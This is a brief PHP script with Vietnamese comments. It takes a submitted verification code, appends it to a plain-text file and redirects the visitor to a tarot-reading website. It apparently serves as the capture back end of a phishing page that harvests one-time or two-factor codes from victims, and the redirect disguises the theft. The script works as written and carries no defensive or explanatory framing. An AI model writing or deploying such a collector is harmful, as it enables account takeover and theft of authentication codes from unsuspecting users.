<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $verificationCode = $_POST['verification_code'];

    // Lưu mã xác thực vào file verification_codes.txt
    $file = 'verification_codes.txt';
    $data = "Mã xác thực: $verificationCode\n";
    
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Chuyển hướng tới trang sau khi xác thực thành công
    header("Location: https://boitarot.vn/boi-tarot-online/");
    exit();
} else {
    echo "Yêu cầu không hợp lệ.";
}
?>
